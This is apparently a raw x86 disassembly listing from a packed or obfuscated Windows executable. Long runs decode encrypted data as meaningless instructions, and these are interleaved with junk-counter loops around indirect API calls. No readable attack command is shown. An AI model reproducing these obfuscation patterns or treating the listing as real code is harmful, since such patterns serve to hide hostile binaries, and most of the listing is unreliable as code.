  4058c4:	push   cs
  4058c5:	pushf  
  4058c6:	imul   cx,WORD PTR [edi],0x2143
  4058cb:	mov    ds:0x6d9e4fe0,eax
  4058d0:	in     eax,0xff
  4058d2:	xor    edx,DWORD PTR [ebp-0x720c31cf]
  4058d8:	adc    ecx,ebx
  4058da:	ja     0x40591d
  4058dc:	inc    edi
  4058dd:	mov    dh,0x6e
  4058df:	mov    al,0xdf
  4058e1:	shl    DWORD PTR [ebp+0x45],1
  4058e4:	jp     0x40589a
  4058e6:	push   edi
  4058e7:	call   0x38a2:0xe29e3fc6
  4058ee:	(bad)  
  4058f0:	aaa    
  4058f1:	cmp    eax,0x8c3c490
  4058f6:	inc    ecx
  4058f7:	mov    edi,0x32a0146b
  4058fc:	mul    DWORD PTR [ebp+ecx*4-0x69]
  405900:	mov    ds:0x8ee32b6b,eax
  405905:	pushf  
  405906:	pop    ebp
  405907:	xchg   ebx,eax
  405908:	adc    DWORD PTR [esi],0xffffff8a
  40590b:	jno    0x4058d9
  40590d:	dec    ebp
  40590e:	imul   ecx,DWORD PTR [esi+0x20569d2f],0x7a88a301
  405918:	mov    ds:0xa72b2788,al
  40591d:	inc    ebx
  40591e:	mov    al,ds:0x31642100
  405923:	shl    DWORD PTR [ebp+0x189aeb09],1
  405929:	aas    
  40592a:	in     al,dx
  40592b:	pop    edi
  40592c:	mov    bh,0xdd
  40592e:	mov    ah,0x82
  405930:	test   DWORD PTR [edi-0x73f3d66],ebp
  405936:	or     eax,0x1c0d95be
  40593b:	xlat   BYTE PTR ds:[ebx]
  40593c:	(bad)  
  40593d:	icebp  
  40593e:	lea    edx,[edx-0x3e1ac52d]
  405944:	pop    esp
  405945:	mov    bl,al
  405947:	cmp    BYTE PTR [ebp-0x6],ah
  40594a:	jbe    0x40599c
  40594c:	das    
  40594d:	out    dx,al
  40594e:	(bad)  
  40594f:	cdq    
  405950:	subps  xmm6,xmm2
  405953:	add    esi,edi
  405955:	fidiv  WORD PTR [esp+edx*8+0x1a]
  405959:	and    al,0x55
  40595b:	daa    
  40595c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40595d:	cli    
  40595e:	idiv   DWORD PTR [esi+esi*8-0x93a171f]
  405965:	push   ds
  405966:	fucomp st(6)
  405968:	mov    dl,0x4e
  40596a:	or     al,0x7d
  40596c:	idiv   DWORD PTR [ecx+0x73b29c63]
  405972:	mov    ds:0xfcb51919,al
  405977:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405978:	test   BYTE PTR [edx],0x79
  40597b:	arpl   WORD PTR [esi+0x7b],dx
  40597e:	repz dec esp
  405980:	gs iret 
  405982:	dec    edx
  405983:	or     al,dh
  405985:	js     0x4059e8
  405987:	iret   
  405988:	imul   ebp,DWORD PTR [ebx],0xbade2ad4
  40598e:	mov    BYTE PTR ds:0xc243eaf6,bh
  405994:	lods   al,BYTE PTR ds:[esi]
  405995:	xchg   ebx,eax
  405996:	(bad)  
  405997:	out    dx,eax
  405998:	sbb    BYTE PTR [esi-0x20],bl
  40599b:	retf   
  40599c:	mov    bh,0x10
  40599e:	xchg   esp,eax
  40599f:	rcl    BYTE PTR [eax+0x244e01db],1
  4059a5:	inc    ebp
  4059a6:	jbe    0x4059ec
  4059a8:	loop   0x405a1c
  4059aa:	cmp    al,BYTE PTR [eax-0x9564f75]
  4059b0:	jmp    0x4059e5
  4059b2:	(bad)  
  4059b4:	imul   esi,DWORD PTR [esi+0xd38bb9f],0x64
  4059bb:	fnstenv [eax]
  4059bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059be:	mov    ecx,DWORD PTR ds:0x40d64c
  4059c4:	add    DWORD PTR [eax],ecx
  4059c6:	pop    edi
  4059c7:	pop    esi
  4059c8:	pop    ebx
  4059c9:	leave  
  4059ca:	ret    
  4059cb:	push   ebp
  4059cc:	mov    ebp,esp
  4059ce:	sub    esp,0x44
  4059d1:	push   edi
  4059d2:	sub    eax,DWORD PTR ds:0x4245b6
  4059d8:	mov    eax,DWORD PTR [ebp+0xc]
  4059db:	or     DWORD PTR ds:0x417e4d,edx
  4059e1:	mov    DWORD PTR [ebp-0x10],eax
  4059e4:	mov    DWORD PTR ds:0x417e55,0x17
  4059ee:	cmp    DWORD PTR ds:0x417e55,0x0
  4059f5:	je     0x405a59
  4059fb:	cmp    DWORD PTR ds:0x417e55,0x6
  405a02:	jne    0x405a2b
  405a08:	push   DWORD PTR [ebp-0x24]
  405a0b:	push   DWORD PTR [ebp-0x28]
  405a0e:	push   0x417e45
  405a13:	push   0x80ed
  405a18:	push   0x67be
  405a1d:	push   0x6b4c
  405a22:	push   DWORD PTR [ebp-0x20]
  405a25:	call   DWORD PTR ds:0x40d1cc
  405a2b:	cmp    DWORD PTR ds:0x417e55,0x7
  405a32:	jne    0x405a47
  405a38:	xor    ecx,ecx
  405a3a:	or     ecx,DWORD PTR ds:0x417e55
  405a40:	dec    ecx
  405a41:	mov    DWORD PTR ds:0x417e55,ecx
  405a47:	mov    ecx,DWORD PTR ds:0x417e55
  405a4d:	dec    ecx
  405a4e:	mov    DWORD PTR ds:0x417e55,ecx
  405a54:	jmp    0x4059ee
  405a59:	mov    eax,DWORD PTR [ebp+0x8]
  405a5c:	or     DWORD PTR ds:0x417e41,0x3fc5
  405a66:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  405a6d:	xor    ecx,ecx
  405a6f:	add    ecx,DWORD PTR ds:0x4245b2
  405a75:	and    DWORD PTR ds:0x41abd6,ecx
  405a7b:	mov    DWORD PTR [ebp-0x20],0xf89c853b
  405a82:	mov    edx,DWORD PTR [ebp+0x8]
  405a85:	mov    DWORD PTR [ebp-0x40],eax
  405a88:	mov    eax,0x7510859
  405a8d:	xor    edx,eax
  405a8f:	adc    ecx,ecx
  405a91:	mov    ecx,0x32729f
  405a96:	movzx  edi,WORD PTR ds:0x41510d
  405a9d:	sbb    DWORD PTR ds:0x4245be,edi
  405aa3:	add    edx,ecx
  405aa5:	add    DWORD PTR ds:0x412354,0x1575
  405aaf:	mov    DWORD PTR [ebp-0x8],edx
  405ab2:	jmp    0x405c04
  405ab7:	(bad)  [edi+ebp*4-0x19]
  405abb:	mov    eax,ds:0x80785be5
  405ac0:	cmp    DWORD PTR ds:[edi],edx
  405ac3:	repz popf 
  405ac5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ac6:	lods   al,BYTE PTR ds:[esi]
  405ac7:	xchg   BYTE PTR [ebx],cl
  405ac9:	jle    0x405b49
  405acb:	and    edi,DWORD PTR [edi+0x7e]
  405ace:	jle    0x405af6
  405ad0:	adc    BYTE PTR [eax-0x5b],dh
  405ad3:	jbe    0x405b33
  405ad5:	ret    
  405ad6:	cmp    al,0xa5
  405ad9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ada:	shl    BYTE PTR [edx+0x121e8ebc],1
  405ae0:	dec    eax
  405ae1:	nop
  405ae2:	stos   BYTE PTR es:[edi],al
  405ae3:	lods   al,BYTE PTR ds:[esi]
  405ae4:	cld    
  405ae5:	mov    ds:0xd33c0609,eax
  405aea:	mov    bl,0xe5
  405aec:	(bad)  
  405aed:	in     al,dx
  405aee:	add    BYTE PTR [eax],ah
  405af0:	stos   DWORD PTR es:[edi],eax
  405af1:	dec    ebp
  405af2:	cmovne edx,DWORD PTR [edi+ebx*4-0x62]
  405af7:	fsubr  st(6),st
  405af9:	dec    ecx
  405afa:	or     ecx,DWORD PTR [esi-0x7a]
  405afd:	(bad)  [esi+0x77]
  405b00:	out    0x49,al
  405b02:	icebp  
  405b03:	mov    ebp,0x22173e8e
  405b08:	sub    DWORD PTR [esi],esi
  405b0a:	dec    eax
  405b0b:	pop    es
  405b0c:	lea    esi,[ecx]
  405b0e:	icebp  
  405b0f:	scas   al,BYTE PTR es:[edi]
  405b10:	xlat   BYTE PTR ds:[ebx]
  405b11:	xchg   edx,eax
  405b12:	out    0x62,al
  405b14:	pop    ds
  405b15:	pushf  
  405b16:	(bad)  
  405b17:	test   al,0x5a
  405b19:	aad    0x3f
  405b1b:	xchg   ebx,eax
  405b1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b1d:	(bad)  
  405b1e:	das    
  405b1f:	or     DWORD PTR [edi],ecx
  405b21:	fcomp  QWORD PTR [ecx-0x306bc078]
  405b27:	lahf   
  405b28:	xchg   edx,eax
  405b29:	or     ecx,DWORD PTR ds:0xede1b455
  405b2f:	adc    eax,DWORD PTR [eax+0x4]
  405b32:	stc    
  405b33:	lock mov dh,0x5
  405b36:	rcl    DWORD PTR [edi],cl
  405b38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b39:	inc    eax
  405b3a:	(bad)
  405b3d:	mov    ecx,0xe25d8dd9
  405b42:	fisub  DWORD PTR [eax-0x3]
  405b45:	pcmpeqb mm7,QWORD PTR [edx-0x4e]
  405b49:	ror    edi,0x40
  405b4c:	mov    bl,BYTE PTR [ebp+ebx*2+0x9b9a886]
  405b53:	adc    DWORD PTR [ecx+ebx*1-0x1c],ebx
  405b57:	std    
  405b58:	mov    ss,ebp
  405b5a:	sub    cl,BYTE PTR [ebx-0x45e6ad1f]
  405b60:	add    eax,0x72ae9930
  405b65:	jmp    0x40f:0xd663c86c
  405b6c:	mov    DWORD PTR [eax-0x30a7cf3d],ecx
  405b72:	mov    esi,DWORD PTR [ebp+0x1b0a48ac]
  405b78:	push   ds
  405b79:	adc    eax,0x1ff633e6
  405b7e:	int    0x11
  405b80:	ret    
  405b81:	pushf  
  405b82:	(bad)  
  405b84:	lds    ebp,FWORD PTR [ebp-0x16]
  405b87:	adc    DWORD PTR [ecx-0x3b],edx
  405b8a:	loop   0x405bf0
  405b8c:	hlt    
  405b8d:	ret    0x4338
  405b90:	cs aas 
  405b92:	jns    0x405b27
  405b94:	inc    edi
  405b95:	sbb    al,0x82
  405b97:	cmp    dl,BYTE PTR [ebx-0x27285ada]
  405b9d:	add    eax,0xe3862986
  405ba2:	sub    eax,DWORD PTR [edx+0x71]
  405ba5:	int    0xae
  405ba7:	fcomp  DWORD PTR [edx+eax*4-0x1bea2e47]
  405bae:	(bad)
  405bb1:	xchg   BYTE PTR [ecx+edx*8],bl
  405bb4:	xchg   ebx,eax
  405bb5:	mov    bl,0xf
  405bb7:	inc    ecx
  405bb8:	jl     0x405bf9
  405bba:	cli    
  405bbb:	dec    ebx
  405bbc:	push   0xc6558f6a
  405bc1:	jo     0x405b87
  405bc3:	aaa    
  405bc4:	pop    ds
  405bc5:	mov    ebx,0x4572b245
  405bca:	xchg   ecx,eax
  405bcb:	shl    cl,1
  405bcd:	rol    DWORD PTR [ebp-0x6c],1
  405bd0:	mov    esp,0x6e1c1621
  405bd5:	mov    BYTE PTR [eax+0x6af0f434],dl
  405bdb:	iret   
  405bdc:	mov    ebx,0xb964a125
  405be1:	xchg   ebx,eax
  405be2:	adc    eax,DWORD PTR [ebx+0x220b6962]
  405be8:	xor    BYTE PTR [edi+0xc],ch
  405beb:	test   ah,cl
  405bed:	sub    al,BYTE PTR [ecx+0x20]
  405bf0:	stos   BYTE PTR es:[edi],al
  405bf1:	outs   dx,BYTE PTR ds:[si]
  405bf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bf4:	pop    esi
  405bf5:	mov    bl,0x1a
  405bf7:	mov    gs,WORD PTR [esi]
  405bf9:	add    esp,edx
  405bfb:	xchg   edi,eax
  405bfc:	add    edx,DWORD PTR [eax]
  405bfe:	mov    al,ds:0x7c9aa723
  405c03:	xchg   BYTE PTR [ebx+0x25810855],cl
  405c09:	mov    BYTE PTR [ebp+0x42],0x0
  405c0d:	add    BYTE PTR [eax],al
  405c0f:	add    BYTE PTR [eax],al
  405c11:	jmp    0x405c25
  405c16:	xor    edi,edi
  405c18:	or     edi,DWORD PTR ds:0x4245c6
  405c1e:	inc    edi
  405c1f:	mov    DWORD PTR ds:0x4245c6,edi
  405c25:	cmp    DWORD PTR ds:0x4245c6,0x11
  405c2c:	jae    0x405c53
  405c32:	cmp    DWORD PTR ds:0x4245c6,0x1a
  405c39:	jne    0x405c48
  405c3f:	push   DWORD PTR [ebp-0x1c]
  405c42:	call   DWORD PTR ds:0x40d29c
  405c48:	jmp    0x405c16
  405c4d:	xor    DWORD PTR ds:0x412358,ebx
  405c53:	xor    edx,eax
  405c55:	add    edx,ecx
  405c57:	jmp    0x405da9
  405c5c:	xchg   edi,eax
  405c5d:	(bad)  
  405c5e:	call   0xe86f:0x6bdabbc6
  405c65:	pop    ds
  405c66:	jb     0x405cc2
  405c68:	sub    al,0xae
  405c6a:	sub    eax,0x7e084bcf
  405c6f:	jle    0x405c94
  405c71:	jg     0x405cf1
  405c73:	jle    0x405c4a
  405c75:	call   0xc269:0x415b7235
  405c7c:	dec    esp
  405c7d:	std    
  405c7e:	ret    0x1063
  405c81:	inc    esp
  405c82:	sti    
  405c83:	mov    ah,0xc2
  405c85:	bound  eax,QWORD PTR [ebp+0x57]
  405c88:	pop    ebx
  405c89:	popa   
  405c8a:	(bad)  
  405c8b:	adc    cl,BYTE PTR ss:[ebp+0x33e5fa2d]
  405c92:	idiv   DWORD PTR [eax-0x2]
  405c95:	jle    0x405d01
  405c97:	xchg   edi,eax
  405c98:	nop
  405c99:	inc    ecx
  405c9a:	cld    
  405c9b:	ret    
  405c9c:	(bad)  
  405c9d:	pop    esi
  405c9e:	aad    0xf7
  405ca0:	xchg   dh,dh
  405ca2:	icebp  
  405ca3:	or     BYTE PTR [ebp+0x65],dh
  405ca6:	inc    esi
  405ca7:	ret    
  405ca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ca9:	shl    bh,1
  405cab:	xchg   edx,edi
  405cad:	lahf   
  405cae:	xchg   BYTE PTR cs:[ebx+0x53],cl
  405cb2:	stos   BYTE PTR es:[edi],al
  405cb3:	fnstenv [ecx-0x6a3c7f07]
  405cb9:	gs xchg ebp,eax
  405cbb:	mov    esi,DWORD PTR [edx]
  405cbd:	retf   
  405cbe:	pusha  
  405cbf:	out    0x2d,al
  405cc1:	sub    esi,DWORD PTR [edx]
  405cc3:	iret   
  405cc4:	push   esi
  405cc5:	gs cs pop ebx
  405cc8:	xchg   esp,eax
  405cc9:	test   BYTE PTR [esi+0x5c4d578f],0xe9
  405cd0:	aas    
  405cd1:	retf   0x39b4
  405cd4:	xchg   ebp,eax
  405cd5:	dec    eax
  405cd6:	cmp    al,0x3d
  405cd8:	repnz push eax
  405cda:	or     al,0xa3
  405cdc:	cmp    edi,DWORD PTR [eax-0x3ccc53ca]
  405ce2:	pop    ebp
  405ce3:	xchg   ecx,eax
  405ce4:	add    ecx,ecx
  405ce6:	pop    edx
  405ce7:	push   ebx
  405ce8:	cmc    
  405ce9:	inc    esp
  405cea:	jmp    0xa7e:0x8357bdb
  405cf1:	sbb    bl,al
  405cf3:	cmp    DWORD PTR [ebx+edi*1-0x6a524a38],eax
  405cfa:	and    BYTE PTR [esi],ch
  405cfc:	or     al,0xd3
  405cfe:	fdivr  DWORD PTR [eax]
  405d00:	sbb    DWORD PTR [ecx+edi*4+0x7bec444e],0x930266fd
  405d0b:	dec    edi
  405d0c:	jmp    0xffce7753
  405d11:	adc    dl,ch
  405d13:	sar    BYTE PTR [esp+ebx*2],1
  405d16:	xor    al,0xd4
  405d18:	cdq    
  405d19:	aaa    
  405d1a:	add    BYTE PTR es:[ecx],dh
  405d1d:	mov    al,0xa2
  405d1f:	pop    edi
  405d20:	test   eax,0x9107be3b
  405d25:	pop    es
  405d26:	xchg   DWORD PTR [esi],esi
  405d28:	jge    0x405cea
  405d2a:	fsubrp st(7),st
  405d2c:	das    
  405d2d:	addr16 push esp
  405d2f:	dec    ebx
  405d30:	push   ss
  405d31:	push   ebx
  405d32:	enter  0xde33,0xa1
  405d36:	sub    dl,cl
  405d38:	out    dx,eax
  405d39:	les    edi,FWORD PTR [edi-0x77]
  405d3c:	xor    eax,0xb17c5141
  405d41:	lods   al,BYTE PTR ds:[esi]
  405d42:	jno    0x405da8
  405d44:	jle    0x405d45
  405d46:	mov    BYTE PTR fs:[ebx+0x2502da41],ch
  405d4d:	addr16 xchg ebx,eax
  405d4f:	cmp    cl,BYTE PTR es:[edx+0x6b]
  405d53:	js     0x405d25
  405d55:	aas    
  405d56:	loop   0x405d29
  405d58:	shl    bh,1
  405d5a:	mov    al,ds:0x8769d228
  405d5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d60:	ds dec edi
  405d62:	xor    DWORD PTR [esi-0x1b],eax
  405d65:	cwde   
  405d66:	sbb    BYTE PTR [edx+0x3e6c6cbf],dl
  405d6c:	adc    BYTE PTR [ecx+0x309ebc3],dl
  405d72:	pop    edx
  405d73:	dec    ebx
  405d74:	xchg   edx,eax
  405d75:	sbb    eax,0x296c3eae
  405d7a:	test   ebp,edi
  405d7c:	out    dx,al
  405d7d:	mov    edx,0x9679e22a
  405d82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d83:	lods   al,BYTE PTR ds:[esi]
  405d84:	or     eax,0x623dab6
  405d89:	mov    cs,WORD PTR [ecx+0x5740716d]
  405d8f:	or     esi,ebx
  405d91:	mov    BYTE PTR [ecx-0x2d741160],ch
  405d97:	xchg   edi,eax
  405d98:	lods   eax,DWORD PTR ds:[esi]
  405d99:	adc    bh,al
  405d9b:	lock fwait
  405d9d:	jle    0x405d36
  405d9f:	(bad)  
  405da0:	lahf   
  405da1:	in     al,0xb9
  405da3:	scas   eax,DWORD PTR es:[edi]
  405da4:	jmp    FWORD PTR [esi+0xe]
  405da7:	adc    al,0xe5
  405da9:	mov    DWORD PTR [ebp+0xc],edx
  405dac:	inc    edi
  405dad:	jmp    0x405eff
  405db2:	or     eax,0xb8afae9b
  405db7:	mov    ebx,0x598db90d
  405dbc:	or     al,0x3
  405dbe:	push   cs
  405dbf:	imul   DWORD PTR [edx+0x7e0e7ca3]
  405dc5:	jle    0x405dea
  405dc7:	jg     0x405e47
  405dc9:	jle    0x405df4
  405dcb:	nop
  405dcc:	(bad)  
  405dce:	cmp    DWORD PTR ds:0xb037c0be,esp
  405dd4:	sub    DWORD PTR [eax-0x4],0x66
  405dd8:	ja     0x405df6
  405dda:	hlt    
  405ddb:	sbb    DWORD PTR [esi+eax*4-0x413e3729],esp
  405de2:	jg     0x405e15
  405de4:	ins    BYTE PTR es:[edi],dx
  405de5:	push   ds
  405de6:	aaa    
  405de7:	cmp    DWORD PTR [edx+0x59],esi
  405dea:	test   al,bh
  405dec:	ret    
  405ded:	retf   
  405dee:	(bad)  
  405def:	out    0xd7,al
  405df1:	adc    ah,ah
  405df3:	in     al,0x64
  405df5:	dec    esi
  405df6:	test   DWORD PTR [eax+0x48],ebx
  405df9:	rol    DWORD PTR [esi+0x39762012],1
  405dff:	inc    esi
  405e00:	or     DWORD PTR [esi-0x54],esp
  405e03:	lods   eax,DWORD PTR ds:[esi]
  405e04:	fadd   DWORD PTR [ebp-0x4f]
  405e07:	mov    DWORD PTR [eax+eiz*1],edx
  405e0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e0b:	lock cld 
  405e0d:	mov    ds:0x7c467b7f,eax
  405e12:	pop    eax
  405e13:	push   ebp
  405e14:	pop    es
  405e15:	pop    ds
  405e16:	cmp    BYTE PTR [ecx-0x25],bh
  405e19:	test   eax,0xe41f7dc9
  405e1e:	mov    ds:0x5535f019,eax
  405e23:	les    ecx,FWORD PTR [edi+0x35]
  405e26:	call   0x6faf61fe
  405e2b:	vpcomud xmm7,xmm6,XMMWORD PTR [esi+0x71991bd2],0x6a
  405e35:	cvtpi2ps xmm6,QWORD PTR [eax+0x1466f0c4]
  405e3c:	jge    0x405e14
  405e3e:	mov    ch,0x6b
  405e40:	daa    
  405e41:	xchg   ebp,eax
  405e42:	ins    BYTE PTR es:[edi],dx
  405e43:	or     eax,DWORD PTR [esi+0x38141079]
  405e49:	mov    cl,0x55
  405e4b:	xor    BYTE PTR [edx-0x5a],0x6f
  405e4f:	push   edi
  405e50:	fld    TBYTE PTR [eax-0x2e]
  405e53:	xchg   edx,eax
  405e54:	mov    esi,0x10345a8f
  405e59:	cmp    DWORD PTR [edi+0x437de2ba],0x2d
  405e60:	sub    BYTE PTR [eax+0x39],0xd7
  405e64:	les    edi,FWORD PTR [ecx-0xa7ccc18]
  405e6a:	lds    ecx,FWORD PTR [ebx+0x1e]
  405e6d:	pop    ss
  405e6e:	adc    bp,WORD PTR [ebp+0x60]
  405e72:	xchg   ebp,eax
  405e73:	xchg   DWORD PTR [ecx-0x1a],esp
  405e76:	cmp    al,0xa6
  405e78:	xchg   ecx,eax
  405e79:	(bad)  
  405e7a:	(bad)  
  405e7b:	mov    ecx,0xa1f1d9b3
  405e80:	ins    DWORD PTR es:[edi],dx
  405e81:	iret   
  405e82:	dec    ebp
  405e83:	rcr    DWORD PTR [eax*4-0x2c2ce9a0],cl
  405e8a:	pop    ecx
  405e8b:	or     bh,al
  405e8d:	fwait
  405e8e:	std    
  405e8f:	mov    DWORD PTR [ecx-0x691f994c],esp
  405e95:	cmp    al,0xa5
  405e97:	sub    DWORD PTR [bx+si],ecx
  405e9a:	mov    esi,0x4ad9986
  405e9f:	ss loopne 0x405e43
  405ea2:	int    0x75
  405ea4:	fpatan 
  405ea6:	xchg   esp,eax
  405ea7:	sub    al,0xdf
  405ea9:	daa    
  405eaa:	lock sbb DWORD PTR [ebp+0x32],ebx
  405eae:	out    0x1b,al
  405eb0:	paddsw mm6,QWORD PTR [eax+0x5e]
  405eb4:	add    DWORD PTR [ecx+0x36b2c62e],0x1c
  405ebb:	jns    0x405f21
  405ebd:	retf   0xd766
  405ec0:	mov    esi,0x11f90988
  405ec5:	aas    
  405ec6:	test   ch,bl
  405ec8:	ins    BYTE PTR es:[edi],dx
  405ec9:	leave  
  405eca:	outs   dx,BYTE PTR ds:[esi]
  405ecb:	out    dx,al
  405ecc:	sub    BYTE PTR [eax+0x2a],0x7d
  405ed0:	stos   BYTE PTR es:[edi],al
  405ed1:	xchg   ebp,eax
  405ed2:	loope  0x405f1c
  405ed4:	stos   BYTE PTR es:[edi],al
  405ed5:	lods   eax,DWORD PTR ds:[esi]
  405ed6:	pop    esi
  405ed7:	nop
  405ed8:	es mov cl,0x98
  405edb:	(bad)  
  405edc:	int3   
  405edd:	dec    edi
  405ede:	xor    bl,BYTE PTR [eax]
  405ee0:	inc    edi
  405ee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ee2:	fsubrp st(6),st
  405ee4:	add    ch,BYTE PTR [ebx-0x50cbe0d8]
  405eea:	mov    ds,WORD PTR [edi]
  405eec:	popf   
  405eed:	ja     0x405eee
  405eef:	push   es
  405ef0:	(bad)  
  405ef1:	stos   BYTE PTR es:[edi],al
  405ef2:	inc    esp
  405ef3:	cld    
  405ef4:	pop    ecx
  405ef5:	mov    edi,fs
  405ef7:	fidiv  DWORD PTR [edi]
  405ef9:	adc    eax,0x90eb6f21
  405efe:	cld    
  405eff:	mov    DWORD PTR [ebp-0x4],0xf89c85d8
  405f06:	xor    edi,edi
  405f08:	xor    edi,DWORD PTR ds:0x415109
  405f0e:	adc    edi,DWORD PTR ds:0x4245ae
  405f14:	mov    DWORD PTR ds:0x415109,edi
  405f1a:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  405f21:	mov    DWORD PTR [ebp-0x2c],0xf89c853d
  405f28:	adc    edi,edi
  405f2a:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  405f31:	or     DWORD PTR ds:0x4245be,edx
  405f37:	mov    DWORD PTR [ebp-0x34],0xf89c853f
  405f3e:	mov    DWORD PTR ds:0x417e41,0x15
  405f48:	cmp    DWORD PTR ds:0x417e41,0x0
  405f4f:	je     0x405fae
  405f55:	cmp    DWORD PTR ds:0x417e41,0x5
  405f5c:	jne    0x405f7c
  405f62:	push   0x43a6
  405f67:	push   0x41ac41
  405f6c:	push   0x41ac72
  405f71:	push   0x400000
  405f76:	call   DWORD PTR ds:0x40d1d0
  405f7c:	cmp    DWORD PTR ds:0x417e41,0x6
  405f83:	jne    0x405f96
  405f89:	mov    edi,DWORD PTR ds:0x417e41
  405f8f:	dec    edi
  405f90:	mov    DWORD PTR ds:0x417e41,edi
  405f96:	mov    edi,DWORD PTR ds:0x417e41
  405f9c:	dec    edi
  405f9d:	mov    DWORD PTR ds:0x417e41,edi
  405fa3:	jmp    0x405f48
  405fa8:	xor    edi,DWORD PTR ds:0x417e4d
  405fae:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  405fb5:	and    DWORD PTR ds:0x412364,0xe44
  405fbf:	mov    DWORD PTR [ebp-0x3c],0xf89c8531
  405fc6:	or     DWORD PTR ds:0x417e49,0x6f97
  405fd0:	mov    edx,DWORD PTR [ebp+0x8]
  405fd3:	and    DWORD PTR ds:0x417e55,0x0
  405fdd:	jmp    0x405fef
  405fe2:	mov    edi,DWORD PTR ds:0x417e55
  405fe8:	inc    edi
  405fe9:	mov    DWORD PTR ds:0x417e55,edi
  405fef:	cmp    DWORD PTR ds:0x417e55,0x14
  405ff6:	jae    0x40601f
  405ffc:	cmp    DWORD PTR ds:0x417e55,0x1c
  406003:	jne    0x406014
  406009:	push   0x67ac
  40600e:	call   DWORD PTR ds:0x40d2a0
  406014:	jmp    0x405fe2
  406019:	sub    edi,DWORD PTR ds:0x412378
  40601f:	xor    edx,eax
  406021:	mov    edi,DWORD PTR [ebp-0x10]
  406024:	add    edx,ecx
  406026:	cmp    edi,edx
  406028:	mov    DWORD PTR ds:0x412368,0x5602
  406032:	je     0x407428
  406038:	mov    DWORD PTR ds:0x415109,0xf2d
  406042:	jmp    0x406194
  406047:	lock mov ebx,0xdc791c5b
  40604d:	jns    0x40600a
  40604f:	mov    eax,ds:0x25db13c5
  406054:	retf   0x7d8f
  406057:	and    DWORD PTR [edi],ecx
  406059:	jle    0x4060d9
  40605b:	and    edi,DWORD PTR [edi+0x7e]
  40605e:	jle    0x4060bb
  406060:	push   esp
  406061:	adc    dl,BYTE PTR [esi-0x4e]
  406064:	arpl   ax,si
  406066:	nop
  406067:	pop    es
  406068:	and    eax,0xdb08b1d2
  40606d:	cmp    edi,eax
  40606f:	inc    edx
  406070:	loop   0x40606c
  406072:	je     0x40609f
  406074:	and    DWORD PTR [ebx+0x64d3217c],edx
  40607a:	mov    cl,BYTE PTR [ebp+0x3b]
  40607d:	aaa    
  40607e:	pop    ecx
  40607f:	push   ecx
  406080:	xor    eax,0x1cf3a62f
  406085:	loopne 0x4060a2
  406087:	leave  
  406088:	and    esi,esi
  40608a:	mov    esp,0x5514c58f
  40608f:	sahf   
  406090:	mov    ah,0xb4
  406092:	pop    ecx
  406093:	fidiv  DWORD PTR [esi+0x60e55cab]
  406099:	in     al,dx
  40609a:	loop   0x406116
  40609c:	xor    BYTE PTR [edx],ah
  40609e:	push   0xffffff89
  4060a0:	fst    QWORD PTR cs:[esi]
  4060a3:	out    dx,eax
  4060a4:	mov    edx,0xad8ed1cb
  4060a9:	mov    ah,0xfa
  4060ab:	cmp    ebp,DWORD PTR [ebx+0x7b]
  4060ae:	lahf   
  4060af:	ja     0x40610f
  4060b1:	pushf  
  4060b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060b3:	dec    ebp
  4060b4:	inc    ebp
  4060b5:	stc    
  4060b6:	xor    al,BYTE PTR ds:0x9233e5f7
  4060bc:	inc    esp
  4060bd:	add    edx,edx
  4060bf:	inc    esp
  4060c0:	out    0xe3,eax
  4060c2:	mov    dl,BYTE PTR [ebx+0x26]
  4060c5:	push   ss
  4060c6:	jp     0x4060e1
  4060c8:	cmp    BYTE PTR [esi],al
  4060ca:	ror    DWORD PTR [edi+0x5da940da],1
  4060d0:	or     eax,0x65e3c52b
  4060d5:	xchg   esp,eax
  4060d6:	test   BYTE PTR [ebp-0x46],bl
  4060d9:	cs pop ebx
  4060db:	jae    0x406076
  4060dd:	clc    
  4060de:	stc    
  4060df:	jb     0x4060c0
  4060e1:	or     ebp,0xffffffbd
  4060e4:	out    0x33,al
  4060e6:	popf   
  4060e7:	cmp    esi,DWORD PTR [edi+0xb]
  4060ea:	(bad)  [esi+eiz*8+0x3b61af3]
  4060f1:	add    DWORD PTR [edx+0x54],esi
  4060f4:	push   ds
  4060f5:	inc    esp
  4060f6:	push   ss
  4060f7:	mov    cl,BYTE PTR [eax]
  4060f9:	mov    ebx,0xae48622
  4060fe:	loope  0x40613d
  406100:	push   edi
  406101:	xor    ebx,DWORD PTR [ebp-0x5f0a4394]
  406107:	cld    
  406108:	call   0xa5bc6fc2
  40610d:	mov    eax,ebp
  40610f:	arpl   WORD PTR [ebx],di
  406111:	inc    ebp
  406112:	pop    ebx
  406113:	sbb    BYTE PTR [eax],dh
  406115:	leave  
  406116:	je     0x40609e
  406118:	leave  
  406119:	in     al,dx
  40611a:	mov    esp,DWORD PTR [ebx-0x7b866801]
  406120:	js     0x406170
  406122:	scas   eax,DWORD PTR es:[edi]
  406123:	cwde   
  406124:	shl    eax,cl
  406126:	push   ss
  406127:	mov    fs,WORD PTR [esi+0xe]
  40612a:	popa   
  40612b:	ds out dx,eax
  40612d:	imul   BYTE PTR [edx+0x36]
  406130:	inc    esi
  406131:	adc    esp,DWORD PTR [esp+edx*8]
  406134:	or     al,0xb4
  406136:	jmp    0x281e:0x42a7f79b
  40613d:	es push eax
  40613f:	imul   ebp
  406141:	mov    DWORD PTR [ebx+0x6b],ebx
  406144:	ja     0x406173
  406146:	sub    DWORD PTR [ebx+ebp*2+0x6891432f],esp
  40614d:	push   edi
  40614e:	fidiv  DWORD PTR [esi-0x59444fcd]
